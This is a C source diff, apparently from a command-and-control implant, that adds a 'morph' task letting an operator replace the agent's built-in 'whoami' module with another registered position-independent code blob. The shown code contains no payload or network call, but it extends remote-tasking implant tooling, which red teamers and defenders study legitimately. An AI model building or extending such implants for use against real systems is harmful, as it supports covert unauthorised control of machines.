@@ -201,6 +201,34 @@ void agent_execute_pico(AgentState *state, TaskInfo *task) {
 	free_resolved_pico(&pico);
 }
 
+void agent_morph(AgentState *state, TaskInfo *task) {
+	if (task->parameters[0] == 0x09 || MSVCRT$strlen(task->parameters) == 0) {
+		agent_post(state, task, "no command", "error: no command provided");
+		return;
+	}
+
+	char *cmd = MSVCRT$strtok(task->parameters, "\t");
+	char *pico = MSVCRT$strtok(NULL, "\t");
+	
+	if (is_in_vault(&state->file_vault, pico) == FALSE) {
+		agent_post(state, task, "no pico with that name has been registered", "error: pico not found");
+		return;
+	}
+	
+	if (MSVCRT$strcmp(cmd, "whoami") == 0) {
+		if (remove_from_vault(&state->file_vault, state->builtin_picos.whoami) == FALSE) {
+			agent_post(state, task, "failed to remove old command from vault", "error: removal failed");
+			return;
+		}
+		
+		state->builtin_picos.whoami = clone_str(pico);
+		agent_post(state, task, "command replaced", "success");
+		return;
+	}
+	
+	agent_post(state, task, "command not found or morph not supported", "error: command not found");
+}
+
 void process_task(TaskInfo *task, AgentState *state) {
 	if (MSVCRT$strcmp(task->command, "exit") == 0) {
 		#ifdef CELEBI_DEBUG
@@ -244,6 +272,15 @@ void process_task(TaskInfo *task, AgentState *state) {
 		#endif
 		
 		agent_execute_pico(state, task);
+		return;
+	}
+	
+	if (MSVCRT$strcmp(task->command, "morph") == 0) {
+		#ifdef CELEBI_DEBUG
+		dprintf("Received morph command with parameters: '%s'", task->parameters);
+		#endif
+		
+		agent_morph(state, task);
 		return;
 	}
 	
